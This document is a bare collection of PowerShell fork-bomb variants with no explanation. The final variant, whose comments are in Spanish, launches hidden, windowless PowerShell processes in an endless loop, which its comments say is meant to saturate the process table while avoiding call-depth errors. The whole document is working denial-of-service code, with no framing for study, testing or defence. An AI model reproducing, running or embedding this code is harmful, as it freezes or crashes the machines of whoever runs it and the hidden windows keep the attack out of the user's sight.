~~~powershell
function f { f | Start-Job -ScriptBlock { f } }; f
~~~

~~~powershell
function f { f | Start-Job -ScriptBlock ${function:f} }; f
~~~
~~~powershell
function f { Start-Job -ScriptBlock ${function:f} | Out-Null }; do { f } while ($true)
~~~
~~~powershell
function f {
    # Inicializa el proceso hijo apuntando a una nueva sesión oculta de PowerShell
    $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -WindowStyle Hidden -Command  `${function:f} = '${function:f}'; f"
        CreateNoWindow  = $true
        UseShellExecute = $false
    })
}

# Bucle infinito plano (evita el CallDepthOverflow) para saturar la tabla de procesos
do {
    f
} while ($true)
~~~
~~~powershell

~~~


